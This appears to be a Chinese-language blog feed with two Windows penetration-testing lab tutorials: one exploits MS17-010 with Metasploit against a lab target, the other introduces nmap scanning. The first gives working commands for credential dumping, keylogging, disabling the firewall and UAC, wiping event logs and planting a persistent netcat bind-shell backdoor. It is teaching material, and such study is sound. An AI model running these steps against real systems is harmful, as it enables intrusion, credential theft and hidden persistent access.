title="MS15-034 漏洞防御"></a>MS15-034 漏洞防御</h3><p><strong>第五步：MS15-034漏洞防御-关闭内核缓存</strong></p><ul><li>开始菜单 &#x3D;&gt; IIS管理器 &#x3D;&gt; 自己计算机名 &#x3D;&gt; 网站 &#x3D;&gt; Default Web Site &#x3D;&gt; 输出缓存</li></ul><p><img src="/../img/img_artical/net_sec/9.3.1.png" alt="9.3.1"></p><p><strong>第六步：关闭内核缓存后，再次发起漏洞利用</strong></p><ul><li>再次发起漏洞利用，发现Windows靶机安然无恙，不再蓝屏</li></ul><p><strong>第七步：除了关闭内核缓存，也可安装补丁进行漏洞防御</strong></p><ul><li>上传Windows6.1-KB3042553-x64-2008R2.msu到Windows靶机</li><li>安装完补丁后，系统会重启</li></ul><h2 id="CVE-2017-0143漏洞利用"><a href="#CVE-2017-0143漏洞利用" class="headerlink" title="CVE-2017-0143漏洞利用"></a>CVE-2017-0143漏洞利用</h2><h3 id="CVE-2017-0143（MS17-010）漏洞"><a href="#CVE-2017-0143（MS17-010）漏洞" class="headerlink" title="CVE-2017-0143（MS17-010）漏洞"></a>CVE-2017-0143（MS17-010）漏洞</h3><p><strong>漏洞为外界所知源于勒索病毒的爆发，该病毒利用NSA（美国国家安全局）泄露的网络攻击工具永恒之蓝（Eternal Blue）改造而成</strong></p><ul><li>漏洞通过TCP的445和139端口，利用SMB远程代码执行漏洞</li><li>攻击者可以在目标系统上执行任意代码</li></ul><p><strong>影响系统</strong></p><ul><li>Windows7&#x2F;8&#x2F;8.1&#x2F;10</li><li>WindowsServer2008&#x2F;2012&#x2F;2016</li></ul><h3 id="MS17-010漏洞利用"><a href="#MS17-010漏洞利用" class="headerlink" title="MS17-010漏洞利用"></a>MS17-010漏洞利用</h3><p><strong>准备Windows靶机</strong></p><p><strong>第一步：漏洞扫描，使用脚本3进行漏洞扫描</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole -q</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search ms17-010</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   #  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   <span class="attr">-</span>  <span class="string">----                                      ---------------  ----     -----  -----------</span></span><br><span class="line">   <span class="attr">0</span>  <span class="string">exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span></span><br><span class="line">   <span class="attr">2</span>  <span class="string">auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span></span><br><span class="line">   <span class="attr">3</span>  <span class="string">auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span></span><br><span class="line">   <span class="attr">4</span>  <span class="string">exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution         </span></span><br><span class="line">   </span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 3</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/smb/smb_ms17_010) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[+]</span> <span class="string">192.168.10.142:445    - Host is likely VULNERABLE to MS17-010!        //容易遭受MS17-010的攻击</span></span><br></pre></td></tr></table></figure><p><strong>第二步：漏洞利用，建立反弹连接</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0                             //使用攻击脚本</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Using configured payload windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(windows/smb/ms17_010_eternalblue) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">......</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//Meterpreter作为攻击载荷使用，以便后渗透操作</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump             //获取用户和密码</span></span><br><span class="line"><span class="attr">Administrator</span>:<span class="string">500:aad3b435b51404eeaad3b435b51404ee:531b3ca954d0e442e64a5815b6794c32:::</span></span><br><span class="line"><span class="attr">Guest</span>:<span class="string">501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">Server</span> <span class="string">username: NT AUTHORITY\SYSTEM   //获取用户信息</span></span><br></pre></td></tr></table></figure><p><strong>使用hashdump命令导出SAM账号数据</strong></p><p><strong>复制冒号分隔的第4段内容，可用于MD5解密</strong></p><ul><li>可以访问 <a href="https://www.cmd5.com/%E7%A0%B4%E8%A7%A3MD5%E5%BC%B1%E5%AF%86%E7%A0%81">https://www.cmd5.com/破解MD5弱密码</a></li></ul><h3 id="获取账户信息"><a href="#获取账户信息" class="headerlink" title="获取账户信息"></a>获取账户信息</h3><p><strong>第三步：加载kiwi模块，通过kiwi模块获取用户口令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; load kiwi                 //加载kiwi</span></span><br><span class="line"><span class="attr">Loading</span> <span class="string">extension kiwi...</span></span><br><span class="line"><span class="attr">Success.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; creds_all                //读取系统中的账户信息</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Running as SYSTEM                   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">Username</span>          <span class="string">Domain           Password</span></span><br><span class="line"><span class="attr">--------</span>          <span class="string">------           --------</span></span><br><span class="line"><span class="attr">(null)</span>            <span class="string">(null)           (null)</span></span><br><span class="line"><span class="attr">Administrator</span>     <span class="string">WIN-5MQI51VLCDC  ntd.cn123</span></span><br><span class="line"><span class="attr">WIN-5MQI51VLCDC$</span>  <span class="string">WORKGROUP        (null)</span></span><br></pre></td></tr></table></figure><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p><strong>第四步：进程迁移，与稳定进程绑定</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps -S explorer.exe             //查找explorer进程</span></span><br><span class="line"><span class="attr">Filtering</span> <span class="string">on &#x27;explorer.exe&#x27;                                                                                             </span></span><br><span class="line">                                                                                                                        </span><br><span class="line"><span class="attr">Process</span> <span class="string">List                                                                                                            </span></span><br><span class="line">============                                                                                                            </span><br><span class="line">                                                                                                                        </span><br><span class="line"> <span class="attr">PID</span>   <span class="string">PPID  Name          Arch  Session  User                           Path                                           </span></span><br><span class="line"> <span class="attr">---</span>   <span class="string">----  ----          ----  -------  ----                           ----                                           </span></span><br><span class="line"> <span class="attr">2600</span>  <span class="string">2580  explorer.exe  x64   1        WIN-5MQI51VLCDC\Administrator  C:\Windows\Explorer.EXE                        </span></span><br><span class="line">                                                                                                                        </span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 2600                //进程迁移到explorer进程上</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Migrating from 1092 to 2600...                                                                                      </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Migration completed successfully.                                                                                   </span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid                          //获取用户信息                                                                       </span></span><br><span class="line"><span class="attr">Server</span> <span class="string">username: WIN-5MQI51VLCDC\Administrator </span></span><br></pre></td></tr></table></figure><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p><strong>第五步：开启键盘记录</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/capture/keylog_recorder </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Keystrokes being saved in to /root/.msf4/loot/20231227143932_default_192.168.10.142_host.windows.key_497385.txt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//在win2008中打开记事本，输入任意内容</span></span><br><span class="line"><span class="attr">//在kali中重新打开一个终端</span></span><br><span class="line"></span><br><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">cat /root/.msf4/loot/20231227143932_default_192.168.10.142_host.windows.key_497385.txt </span></span><br><span class="line"><span class="attr">Keystroke</span> <span class="string">log from explorer.exe on WIN-5MQI51VLCDC with user WIN-5MQI51VLCDC\Administrator started at 2023-12-27 14:39:32 +0800</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user</span></span><br><span class="line"><span class="attr">&lt;Caps</span> <span class="string">Lock&gt;A&lt;Caps Lock&gt;dministrator</span></span><br><span class="line"><span class="attr">&lt;Caps</span> <span class="string">Lock&gt;T&lt;Caps Lock&gt;edu</span></span><br><span class="line"><span class="attr">.cn123&lt;^S&gt;</span></span><br></pre></td></tr></table></figure><h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p><strong>第六步：添加规则backdoor，开放端口444</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell      //进入命令行</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh advfirewall set allprofiles state off   //关闭防火墙</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh advfirewall set allprofiles state on    //开启防火墙</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh firewall add portopening tcp 444 backdoor enable all</span></span><br><span class="line"><span class="attr">//添加入站规则，规则名backdoor</span> <span class="string">协议 tcp 端口 444</span></span><br></pre></td></tr></table></figure><p><strong>第七步：在win2008中查看防火墙</strong></p><p><img src="/../img/img_artical/net_sec/9.3.2.png" alt="9.3.2"></p><h3 id="关闭用户账户控制"><a href="#关闭用户账户控制" class="headerlink" title="关闭用户账户控制"></a>关闭用户账户控制</h3><p><strong>第八步：操作注册表关闭UAC</strong></p><ul><li>UAC：User Account Control用户帐户控制，是windows操作系统中一种安全控制机制,使用UAC，可以防止未经授权应用程序的自动安装，阻止恶意程序</li><li>ADD添加一个注册表项</li><li>&#x2F;v创建键值     &#x2F;t键值类型       &#x2F;d 键值的值       &#x2F;f强制覆盖</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt; reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure><h3 id="清除目标主机的日志"><a href="#清除目标主机的日志" class="headerlink" title="清除目标主机的日志"></a>清除目标主机的日志</h3><p><strong>使用clearev命令</strong></p><ul><li>完成清除以后，目标主机的安全日志为空</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 519 records from Application...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 2049 records from System...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 1225 records from Security...</span></span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/9.3.3.png" alt="9.3.3"></p><h3 id="监控主机"><a href="#监控主机" class="headerlink" title="监控主机"></a>监控主机</h3><p><strong>使用screenshot拍摄主机当前状态</strong></p><p><strong>使用screenshare监控主机画面</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; screenshot </span></span><br><span class="line"><span class="attr">Screenshot</span> <span class="string">saved to: /root/AKDYyBKA.jpeg</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; screenshare </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Preparing player...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Opening player at: /root/tiUhUAUW.html</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Streaming...</span></span><br></pre></td></tr></table></figure><h2 id="持久性后门程序"><a href="#持久性后门程序" class="headerlink" title="持久性后门程序"></a>持久性后门程序</h2><h3 id="瑞士军刀"><a href="#瑞士军刀" class="headerlink" title="瑞士军刀"></a>瑞士军刀</h3><p><strong>NC：（netcat）</strong></p><ul><li>被称为网络工具中的瑞士军刀，体积小巧，但功能强大</li><li>NC主要功能可以在两台设备上面相互交互，即侦听模式&#x2F;传输模式</li></ul><p><strong>环境准备</strong></p><ul><li>靶机：Windows</li></ul><h3 id="添加NC后门"><a href="#添加NC后门" class="headerlink" title="添加NC后门"></a>添加NC后门</h3><p><strong>第一步：上传nc.exe后门文件</strong></p><ul><li>上传后门程序nc.exe到Windows靶机</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32\nc.exe</span></span><br></pre></td></tr></table></figure><ul><li>查看上传结果及权限</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ls nc.exe</span></span><br><span class="line"><span class="attr">100777/rwxrwxrwx</span>  <span class="string">59392  fil  2023-12-27 17:31:09 +0800  nc.exe</span></span><br></pre></td></tr></table></figure><p><strong>第二步：将nc.exe添加开机启动，监听TCP 444端口</strong></p><ul><li>以”计划任务”方式，开机自启</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;chcp 65001            //修改编码，防止乱码</span></span><br><span class="line"><span class="attr">chcp</span> <span class="string">65001</span></span><br><span class="line"><span class="attr">Active</span> <span class="string">code page: 65001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;schtasks /create /tn &quot;nc&quot; /ru system /tr &quot;c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&quot; /sc onstart</span></span><br><span class="line"><span class="attr">//制订计划任务</span></span><br></pre></td></tr></table></figure><h3 id="查看后门任务计划"><a href="#查看后门任务计划" class="headerlink" title="查看后门任务计划"></a>查看后门任务计划</h3><p><strong>打开windows靶机”计划任务” ，查看nc后门配置</strong></p><p><img src="/../img/img_artical/net_sec/9.3.4.png" alt="9.3.4"></p><h3 id="使用后门"><a href="#使用后门" class="headerlink" title="使用后门"></a>使用后门</h3><p><strong>第三步：使用nc进行后门连接</strong></p><ul><li>重启Windows靶机，不用登录</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nc 192.168.10.142 444             //使用nc建立连接</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;hostname          //查看主机名</span></span><br><span class="line"><span class="attr">hostname</span></span><br><span class="line"><span class="attr">WIN-5MQI51VLCDC</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows渗透测试2</title>
      <link href="/posts/winpte2.html"/>
      <url>/posts/winpte2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows渗透测试"><a href="#Windows渗透测试" class="headerlink" title="Windows渗透测试"></a>Windows渗透测试</h1><h2 id="准备靶机"><a href="#准备靶机" class="headerlink" title="准备靶机"></a>准备靶机</h2><h3 id="Win2008靶机"><a href="#Win2008靶机" class="headerlink" title="Win2008靶机"></a>Win2008靶机</h3><p><strong>占有率高：中国Windows Server占比约为19.07%，其中WindowsServer2008占有率为15%</strong></p><ul><li>注:根据datanyze的统计数据 (采用扫描域名服务统计)</li></ul><p><strong>渗透和防御比较成熟</strong></p><ul><li>微软于2020年1月14日结束对WindowsServer2008支持</li><li>漏洞为黑客所熟悉，防御技术较成熟</li></ul><p><strong>占有资源小，便于演练</strong></p><h3 id="准备Win2008靶机"><a href="#准备Win2008靶机" class="headerlink" title="准备Win2008靶机"></a>准备Win2008靶机</h3><p><strong>下载并解压Win2008.zip，使用Vmware打开</strong></p><ul><li>用户：administrator</li><li>密码：Ntd.cn123</li><li>端口：21、23、25、80、135、445、3389</li></ul><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><h3 id="什么是扫描"><a href="#什么是扫描" class="headerlink" title="什么是扫描"></a>什么是扫描</h3><p><strong>指利用工具或软件来探测目标网络或主机的过程</strong></p><ul><li>是搜集信息的必备环节</li><li>用来获取目标的系统类型&#x2F;软件版本&#x2F;端口开放情况等信息</li><li>也可以检测已知或潜在的漏洞</li></ul><p><strong>常见扫描工具</strong></p><ul><li>Ping</li><li>nmap</li><li>Nessus&#x2F;OpenVAS</li><li>AppScan</li></ul><h3 id="扫描的价值"><a href="#扫描的价值" class="headerlink" title="扫描的价值"></a>扫描的价值</h3><p><strong>对攻击者来说</strong></p><ul><li>根据扫描结果，来决定进一步的攻击行动</li><li>能够更有针对性地选择攻击方法、攻击工具，节省攻击时间</li></ul><p><strong>对防御者来说</strong></p><ul><li>根据扫描结果，判断应采取什么样的安全策略</li><li>封堵漏洞、加固系统、完善访问控制</li></ul><h3 id="关于NMAP"><a href="#关于NMAP" class="headerlink" title="关于NMAP"></a>关于NMAP</h3><p><strong>Network Mapper，一款开源的网络探测器</strong></p><ul><li>采用原始报文方式，可以快速扫描单个主机或大型网络</li><li>识别目标的服务类型、程序版本、防火墙等</li></ul><p><strong>基本用法</strong></p><ul><li>nmap [扫描类型] [选项] &lt;扫描目标 …&gt;</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap 192.168.10.142                                            //快速扫描主机192.168.10.142</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PORT</span>      <span class="string">STATE SERVICE</span></span><br><span class="line"><span class="attr">21/tcp</span>    <span class="string">open  ftp</span></span><br><span class="line"><span class="attr">23/tcp</span>    <span class="string">open  telnet</span></span><br><span class="line"><span class="attr">25/tcp</span>    <span class="string">open  smtp</span></span><br><span class="line"><span class="attr">80/tcp</span>    <span class="string">open  http</span></span><br><span class="line"><span class="attr">135/tcp</span>   <span class="string">open  msrpc                                             //已开放端口</span></span><br><span class="line"><span class="attr">139/tcp</span>   <span class="string">open  netbios-ssn</span></span><br><span class="line"><span class="attr">445/tcp</span>   <span class="string">open  microsoft-ds</span></span><br><span class="line"><span class="attr">3389/tcp</span>  <span class="string">open  ms-wbt-server</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)                           //目标主机MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 2.25 seconds</span></span><br></pre></td></tr></table></figure><h3 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h3><p><strong>扫描方式</strong></p><ul><li>-sS，TCP半开扫描(只发SYN包)，速度快(默认)</li><li>-sT，TCP全开扫描 (尝试全连接) ，结果更准确</li><li>-sU，UDP扫描，用于DNS、SNMP、DHCP等</li></ul><h3 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h3><p><strong>目标地址</strong></p><ul><li>域名、IP地址、网段地址</li><li>比如：192.168.10.142、172.163.10.0&#x2F;24</li></ul><p><strong>目标端口</strong></p><ul><li>比如：-p 3389</li></ul><p><strong>多个目标以 “，” 分隔，连续范围以 “-” 分隔</strong></p><ul><li>比如：10.0.0.1 - 254、192.168.10.2，211</li><li>比如：-p 21-23、-p 21,80,3389</li></ul><h3 id="准备扫描环境"><a href="#准备扫描环境" class="headerlink" title="准备扫描环境"></a>准备扫描环境</h3><p><strong>实验环境</strong></p><ul><li>攻击机：kali2022</li><li>靶机：win2008，还原快照至“靶机”</li></ul><h3 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h3><p><strong>扫描192.168.10.0&#x2F;24网段，检测存活的主机和开放的端口</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sP 192.168.10.0/24                //扫描目标网段（-sP）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.1</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00022s latency).</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:50:56:C0:00:08 (VMware)</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.2</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00018s latency).</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:50:56:EB:B5:9E (VMware)</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.142</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00026s latency).</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.254</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up (0.00014s latency).</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:50:56:FA:78:70 (VMware)</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">scan report for 192.168.10.224</span></span><br><span class="line"><span class="attr">Host</span> <span class="string">is up.</span></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 256 IP addresses (5 hosts up) scanned in 2.04 seconds</span></span><br></pre></td></tr></table></figure><h3 id="进行TCP半开扫描"><a href="#进行TCP半开扫描" class="headerlink" title="进行TCP半开扫描"></a>进行TCP半开扫描</h3><p><strong>检查目标主机开放了哪些端口</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sS 192.168.10.142                                       //TCP半开扫描的方式扫描主机开放的端口</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PORT</span>      <span class="string">STATE SERVICE</span></span><br><span class="line"><span class="attr">21/tcp</span>    <span class="string">open  ftp</span></span><br><span class="line"><span class="attr">23/tcp</span>    <span class="string">open  telnet</span></span><br><span class="line"><span class="attr">25/tcp</span>    <span class="string">open  smtp</span></span><br><span class="line"><span class="attr">80/tcp</span>    <span class="string">open  http</span></span><br><span class="line"><span class="attr">135/tcp</span>   <span class="string">open  msrpc                                             //已开放端口</span></span><br><span class="line"><span class="attr">139/tcp</span>   <span class="string">open  netbios-ssn</span></span><br><span class="line"><span class="attr">445/tcp</span>   <span class="string">open  microsoft-ds</span></span><br><span class="line"><span class="attr">3389/tcp</span>  <span class="string">open  ms-wbt-server</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)                           //目标主机MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Nmap</span> <span class="string">done: 1 IP address (1 host up) scanned in 2.25 seconds</span></span><br></pre></td></tr></table></figure><h3 id="检测操作系统"><a href="#检测操作系统" class="headerlink" title="检测操作系统"></a>检测操作系统</h3><p><strong>探测目标主机的操作系统</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nmap -sS -O 192.168.10.142                     //扫描目标主机的操作系统（-O）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address: 00:0C:29:01:FA:F0 (VMware)</span></span><br><span class="line"><span class="attr">Device</span> <span class="string">type: general purpose</span></span><br><span class="line"><span class="attr">Running</span>: <span class="string">Microsoft Windows 7|2008|8.1               //操作系统检测</span></span><br><span class="line"><span 